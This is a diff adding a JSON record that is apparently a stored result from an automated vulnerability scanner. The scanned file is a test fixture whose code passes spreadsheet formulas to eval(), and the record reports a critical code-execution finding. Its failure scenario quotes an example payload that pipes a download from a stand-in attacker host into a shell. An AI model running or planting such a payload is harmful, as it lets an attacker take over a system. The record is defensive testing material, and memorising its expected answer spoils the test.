@@ -1,0 +1,8 @@
+{
+  "key": "f1f0f27c33ea2458665be49bdfa2b2e2",
+  "file": "positive/rce/eval-user-expression.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"rce\",\n    \"lineNumbers\": [8],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"critical\",\n    \"summary\": \"User-controlled spreadsheet formula is executed via eval(), allowing arbitrary JavaScript execution.\",\n    \"rationale\": \"The function computeCell takes a userExpression parameter and passes it directly to eval() without any sanitization. The function is documented to evaluate formula fields from spreadsheet imports, meaning user-controlled data flows directly into eval(). JavaScript's eval() executes arbitrary code with the full privileges of the process.\",\n    \"failureScenario\": \"An attacker imports a spreadsheet containing a malicious formula such as 'require(\\\"child_process\\\").exec(\\\"curl attacker.com | sh\\\")' in a cell. When computeCell() is called with this formula string during import processing, the malicious command executes with the application's privileges, allowing system compromise, data exfiltration, or arbitrary file operations.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.948Z",
+  "elapsedMs": 19861.581153018178
+}
